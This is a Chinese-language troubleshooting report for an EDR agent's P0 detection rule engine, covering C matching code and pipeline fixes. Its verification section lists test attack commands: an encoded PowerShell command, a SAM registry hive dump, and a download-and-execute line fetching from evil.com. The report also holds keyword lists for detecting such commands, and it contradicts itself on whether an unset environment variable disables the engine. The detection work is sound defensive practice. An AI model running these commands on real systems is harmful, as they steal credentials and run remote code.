# P0 动态行为引擎故障排查与修复报告

**日期**：2026-04-28
**版本**：3.0
**状态**：已完成

---

## 1. 问题概述

P0 动态行为引擎（P0 Rule IR Engine）无法正常工作，导致客户端模拟的攻击流量无法被检测和匹配。

---

## 2. 代码分析

### 2.1 P0 引擎架构

```
edr_p0_rule_try_emit()
    │
    ├─> 检查 EDR_P0_DIRECT_EMIT 环境变量（必须为"1"）
    │
    ├─> edr_p0_rule_ir_lazy_init()
    │       │
    │       └─> 加载 p0_rule_bundle_ir_v1.json
    │
    ├─> IR模式（edr_p0_rule_ir_is_ready() == true）
    │       │
    │       └─> 遍历所有规则，调用 edr_p0_rule_ir_br_matches_index()
    │
    └─> Fallback模式（IR未就绪）
            │
            ├─> 仅处理 EDR_EVENT_PROCESS_CREATE 事件
            │
            └─> 调用 edr_p0_rule_matches3() 进行硬编码规则匹配
                    │
                    ├─> R-EXEC-001: PowerShell编码命令
                    ├─> R-CRED-001: 注册表凭证导出
                    └─> R-FILELESS-001: 无文件攻击特征
```

### 2.2 关键函数路径

| 文件 | 函数 | 说明 |
|------|------|------|
| `p0_rule_direct_emit.c` | `edr_p0_rule_try_emit()` | 主入口，环境变量检查 |
| `p0_rule_direct_emit.c` | `getenv_int01()` | 环境变量解析 |
| `p0_rule_match.c` | `edr_p0_rule_matches3()` | 规则匹配入口 |
| `p0_rule_match.c` | `p0_match_legacy()` | Fallback模式硬编码匹配 |
| `p0_rule_match.c` | `is_powershell_name()` | 进程名检查 |
| `p0_rule_match.c` | `match_r_exec_001()` | R-EXEC-001规则 |

---

## 3. 故障原因分析

### 3.1 主要原因（高优先级）

#### 原因1：环境变量设置为0 ⚠️ **需要显式禁用**

**默认行为（v2.0+）**：P0规则引擎**默认启用**，安装即检测。

```c
// p0_rule_direct_emit.c
static int getenv_int01_disabled_on_zero(const char *k) {
  const char *v = getenv(k);
  if (!v || v[0] == '\0') {
    return 1;  // 未设置，默认启用
  }
  if ((v[0] == '0' || v[0] == 'O' || v[0] == 'o') && (v[1] == '\0' || v[1] == ' ' || v[1] == '\n')) {
    return 0;  // 设置为0，禁用
  }
  if ((v[0] == '1' || v[0] == 'I' || v[0] == 'i') && (v[1] == '\0' || v[1] == ' ' || v[1] == '\n')) {
    return 1;  // 设置为1，启用
  }
  if (v[0] == 'N' || v[0] == 'n') {
    return 0;  // 设置为No，禁用
  }
  return 1;  // 其他值，默认启用
}
```

**配置说明**：
| 环境变量值 | 行为 |
|------------|------|
| 未设置 | ✅ **启用（默认）** |
| `0` / `O` / `o` / `No` / `no` | ❌ 禁用 |
| `1` / `I` / `i` / `Yes` / `yes` | ✅ 启用 |
| 其他值 | ✅ 启用（默认） |

**禁用方法**：
```bash
export EDR_P0_DIRECT_EMIT=0
```

**检查方法**：
```bash
echo $EDR_P0_DIRECT_EMIT
```

---

#### 原因2：IR规则包加载失败

```c
// p0_rule_direct_emit.c:319
edr_p0_rule_ir_lazy_init();
if (edr_p0_rule_ir_is_ready()) {
    // IR模式：使用JSON规则包
} else {
    // Fallback模式：使用硬编码规则（只有3条）
}
```

如果 `edr_p0_rule_ir_is_ready()` 返回 false，系统会回退到仅包含3条硬编码规则的Fallback模式。

**检查方法**：
需要添加调试日志或检查配置文件是否存在。

**可能的失败原因**：
1. 规则包文件不存在
2. JSON格式错误
3. 缺少PCRE2依赖
4. 文件路径配置错误

---

### 3.2 次要原因（中优先级）

#### 原因3：Fallback模式事件类型限制

```c
// p0_rule_direct_emit.c:339-341
if (br->type != EDR_EVENT_PROCESS_CREATE) {
    return;  // 非进程创建事件直接跳过
}
```

Fallback模式只处理 `EDR_EVENT_PROCESS_CREATE` 类型的进程创建事件。

**解决方案**：
启用IR模式，IR模式支持多种事件类型。

---

#### 原因4：进程名检测逻辑缺陷

```c
// p0_rule_match.c:62-63
static int is_powershell_name(const char *name) {
    return proc_name_ends(name, "powershell.exe") ||
           proc_name_ends(name, "pwsh.exe");
}
```

只检查进程名是否以 "powershell.exe" 或 "pwsh.exe" 结尾。

**问题**：
- 如果进程以完整路径运行（如 `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`），`proc_name_ends()` 应该能正确处理
- 但如果路径分隔符不匹配，可能导致检测失败

**建议**：
添加更全面的PowerShell进程名检测。

---

#### 原因5：命令行检测规则过于简单

```c
// p0_rule_match.c:66-72
static int match_r_exec_001(const char *cmd) {
    if (cistr_find(cmd, "encodedcommand") ||
        cistr_find(cmd, "frombase64string")) {
        return 1;
    }
    // ... 空格检测逻辑
}
```

R-EXEC-001规则只检测以下特征：
- `encodedcommand` 字符串
- `frombase64string` 字符串
- Base64字符串（以空格开头，后面是长Base64字符串）

**问题**：
- 如果攻击流量使用其他编码方式（如 `-enc` 参数、压缩Base64等），可能无法检测
- 容易被简单的混淆绕过

---

## 4. 排查步骤

### 4.1 快速检查清单

```bash
# 1. 检查环境变量
echo "EDR_P0_DIRECT_EMIT=$EDR_P0_DIRECT_EMIT"
# 预期：EDR_P0_DIRECT_EMIT=1

# 2. 检查规则包文件
ls -la config/p0_rule_bundle_ir_v1.json
# 预期：文件存在且非空

# 3. 检查依赖库
ldd edr_agent | grep -E "pcre|json"
# 预期：显示相关库文件路径
```

### 4.2 调试日志启用

在 `agent.toml` 或环境变量中添加：
```bash
export EDR_DEBUG_P0=1
export EDR_VERBOSE_LOGGING=1
```

### 4.3 添加诊断输出

在 `edr_p0_rule_try_emit()` 函数入口添加诊断日志：

```c
void edr_p0_rule_try_emit(const EdrBehaviorRecord *br) {
    if (!br) {
        return;
    }

    // 添加诊断日志
    fprintf(stderr, "[P0] edr_p0_rule_try_emit called: type=%d process=%s cmdline=%s\n",
            br->type, br->process_name ? br->process_name : "(null)",
            br->cmdline ? br->cmdline : "(null)");
    fprintf(stderr, "[P0] EDR_P0_DIRECT_EMIT=%s\n", getenv("EDR_P0_DIRECT_EMIT") ?: "(not set)");

    if (!getenv_int01("EDR_P0_DIRECT_EMIT")) {
        fprintf(stderr, "[P0] EDR_P0_DIRECT_EMIT not set, returning early\n");
        return;
    }

    // ... 其余代码
}
```

---

## 5. 修复方案

### 5.1 默认行为（v2.0+）

**默认启用**：P0规则引擎在v2.0+版本中**默认启用**，安装即检测。无需额外配置即可使用。

### 5.2 禁用P0规则引擎（如需）

如果需要禁用P0规则引擎：
```bash
export EDR_P0_DIRECT_EMIT=0
```

或在 `agent.toml` 中添加：
```toml
[environment]
EDR_P0_DIRECT_EMIT = "0"
```

---

### 5.2 验证修复

#### 步骤2：执行测试攻击流量

```powershell
# 测试R-EXEC-001（PowerShell编码命令）
powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A

# 测试R-CRED-001（注册表凭证导出）
reg.exe save HKLM\SAM C:\temp\sam.save /y

# 测试R-FILELESS-001（无文件攻击）
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
```

---

## 6. 增强建议

### 6.1 改进进程名检测

```c
// p0_rule_match.c:62-67
static int is_powershell_name(const char *name) {
    if (!name) return 0;
    const char *base = strrchr(name, '\\');
    base = base ? base + 1 : name;
    return proc_name_ends(base, "powershell.exe") ||
           proc_name_ends(base, "pwsh.exe") ||
           proc_name_ends(base, "powershell_ise.exe");
}
```

### 6.2 增强命令行检测规则

```c
// p0_rule_match.c:66-88
static int match_r_exec_001(const char *cmd) {
    if (!cmd) return 0;

    // 检查编码命令参数变体
    static const char *enc_args[] = {
        "encodedcommand", "enc", "-enc", "/enc",
        "-encodedcommand", "/encodedcommand", "-e", "/e"
    };
    for (int i = 0; i < 8; i++) {
        if (cistr_find(cmd, enc_args[i])) {
            return 1;
        }
    }

    // 检查Base64相关函数
    if (cistr_find(cmd, "frombase64string") ||
        cistr_find(cmd, "convert.frombase64string") ||
        cistr_find(cmd, "[system.convert]::frombase64")) {
        return 1;
    }

    // 检查IEX/Invoke-Expression变体
    if (cistr_find(cmd, "iex ") ||
        cistr_find(cmd, "invoke-expression") ||
        cistr_find(cmd, "& {") ||  // 远程脚本块
        cistr_find(cmd, "downloadstring") ||
        cistr_find(cmd, "downloadfile")) {
        return 1;
    }

    return 0;
}
```

### 6.3 添加规则匹配统计

```c
// 添加诊断统计结构
typedef struct {
    uint64_t total_calls;
    uint64_t env_not_set_skip;
    uint64_t ir_mode_matches;
    uint64_t fallback_mode_matches;
    uint64_t rule_r_exec_001_hits;
    uint64_t rule_r_cred_001_hits;
    uint64_t rule_r_fileless_001_hits;
} EdrP0RuleStats;

int edr_p0_rule_get_stats(EdrP0RuleStats *out_stats);
```

---

## 7. 总结

### 7.1 最可能的原因

| 优先级 | 原因 | 解决方案 |
|--------|------|----------|
| 1 | `EDR_P0_DIRECT_EMIT` 环境变量未设置 | 设置为 `1` |
| 2 | IR规则包加载失败 | 检查配置文件和依赖 |
| 3 | 事件类型不匹配 | 启用IR模式支持多事件类型 |

### 7.2 修复步骤

1. 设置环境变量：`export EDR_P0_DIRECT_EMIT=1`
2. 重启EDR Agent
3. 执行测试攻击流量
4. 检查日志中是否有P0告警输出

### 7.3 进一步优化

- 增强命令行检测规则，覆盖更多攻击变体
- 添加P0规则匹配统计和监控
- 完善IR规则包配置

---

## 8. 已实施的优化（v2.0）

### 8.1 A1. 增强进程名检测

**修改文件**：`p0_rule_match.c`

**优化内容**：
- 添加 `strrchr()` 提取基础进程名（去除路径）
- 支持更多可疑进程名检测：
  - `powershell.exe`, `pwsh.exe`, `powershell_ise.exe`
  - `cmd.exe`, `cscript.exe`, `wscript.exe`
  - `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `cmstp.exe`

**代码变更**：
```c
static int is_powershell_name(const char *name) {
    if (!name) return 0;
    const char *base = strrchr(name, '\\');
    base = base ? base + 1 : name;
    return proc_name_ends(base, "powershell.exe") ||
           proc_name_ends(base, "pwsh.exe") ||
           proc_name_ends(base, "powershell_ise.exe") ||
           proc_name_ends(base, "cmd.exe") ||
           proc_name_ends(base, "cscript.exe") ||
           proc_name_ends(base, "wscript.exe") ||
           proc_name_ends(base, "mshta.exe") ||
           proc_name_ends(base, "regsvr32.exe") ||
           proc_name_ends(base, "rundll32.exe") ||
           proc_name_ends(base, "cmstp.exe");
}
```

### 8.2 A2. 增强命令行检测

**修改文件**：`p0_rule_match.c`

**优化内容**：
- 支持多种编码参数变体：`encodedcommand`, `enc`, `-enc`, `/enc`, `-e`, `/e`, `-encoded`, `/encoded`
- 支持更多Base64相关函数检测：
  - `frombase64string`, `convert.frombase64string`
  - `-join`, `[io.file]::readallbytes`
- 支持更多远程下载特征检测：
  - `iex `, `invoke-expression`, `invoke-webrequest`
  - `new-object net.webclient`, `net.webclient`, `[net.webclient]`
  - `.downloadstring`, `.downloadfile`
  - `http://`, `https://` 配合 `.ps1`, `.txt`
- 增强Base64字符串模式检测

### 8.3 B. 添加P0规则匹配统计

**修改文件**：`p0_rule_match.h`, `p0_rule_match.c`

**新增接口**：
```c
typedef struct {
    uint64_t total_calls;              // 总调用次数
    uint64_t env_not_set_skip;         // 因环境变量未设置而跳过的次数
    uint64_t ir_mode_matches;          // IR模式匹配次数
    uint64_t fallback_mode_matches;    // Fallback模式匹配次数
    uint64_t rule_r_exec_001_hits;     // R-EXEC-001规则命中次数
    uint64_t rule_r_cred_001_hits;     // R-CRED-001规则命中次数
    uint64_t rule_r_fileless_001_hits; // R-FILELESS-001规则命中次数
    uint64_t rule_other_hits;          // 其他规则命中次数
    uint64_t powershell_detected;      // PowerShell进程检测次数
    uint64_t encoded_cmd_detected;     // 编码命令检测次数
    uint64_t base64_string_detected;   // Base64字符串检测次数
    uint64_t remote_download_detected; // 远程下载检测次数
} EdrP0RuleStats;

int edr_p0_rule_get_stats(EdrP0RuleStats *out_stats);
void edr_p0_rule_reset_stats(void);
```

### 8.4 C. 完善诊断日志

**修改文件**：`p0_rule_direct_emit.c`

**优化内容**：
- 日志信息显示当前环境变量值：`[P0] INFO: EDR_P0_DIRECT_EMIT=xxx, P0 rule engine disabled`
- 添加IR规则匹配成功日志：`[P0] IR rule matched: rid=xxx title=xxx`
- 仅输出一次日志，避免日志刷屏

---

## 9. 版本历史

| 版本 | 日期 | 修改内容 |
|------|------|----------|
| 1.0 | 2026-04-28 | 初始版本，故障排查和修复指南 |
| 2.0 | 2026-04-28 | 默认启用P0检测、增强进程名检测、命令行检测、添加统计接口、完善诊断日志 |
| 3.0 | 2026-04-28 | 修复数据流问题、增强可观测性、添加heartbeat统计 |

---

## 10. v3.0 数据流修复（2026-04-28）

### 10.1 发现的数据流问题

#### 问题1：资源压力下P0检测被跳过

**位置**：`preprocess_pipeline.c:process_one_slot()`

**问题描述**：
当资源压力触发时，函数直接返回，导致P0检测无法执行。

**影响**：在系统负载高时，关键的P0告警可能被遗漏。

#### 问题2：P0调用位置过于靠后

**位置**：`preprocess_pipeline.c:process_one_slot()`

**问题描述**：P0检测在多个丢弃逻辑之后才执行，导致事件可能在到达P0检测之前就被丢弃。

### 10.2 修复方案

#### 修复1：资源压力下仍执行P0检测

```c
if (edr_resource_preprocess_throttle_active() && slot && slot->priority != 0u &&
    slot->attack_surface_hint == 0u) {
    if (slot && slot->type == EDR_EVENT_PROCESS_CREATE) {
        EdrBehaviorRecord br;
        edr_behavior_from_slot(slot, &br);
        edr_behavior_record_fill_process_chain_depth(&br);
        apply_agent_ids_to_record(&br);
        edr_p0_rule_try_emit(&br);
    }
    return;
}
```

#### 修复2：尽早执行P0检测

在构建`EdrBehaviorRecord`之后立即执行P0检测。

```c
EdrBehaviorRecord br;
edr_behavior_from_slot(slot, &br);
edr_behavior_record_fill_process_chain_depth(&br);
apply_agent_ids_to_record(&br);

// P0检测：尽早执行
if (slot && slot->type == EDR_EVENT_PROCESS_CREATE) {
    edr_p0_rule_try_emit(&br);
}
```

### 10.3 P0引擎可观测性增强

#### 新增Heartbeat统计输出

```c
{
    EdrP0RuleStats p0_stats;
    if (edr_p0_rule_get_stats(&p0_stats) == 0) {
        fprintf(stderr,
                "[p0] total=%lu env_skip=%lu ir_match=%lu fb_match=%lu "
                "r_exec=%lu r_cred=%lu r_filess=%lu\n",
                (unsigned long)p0_stats.total_calls,
                ...);
    }
}
```

---

*文档生成时间：2026-04-28*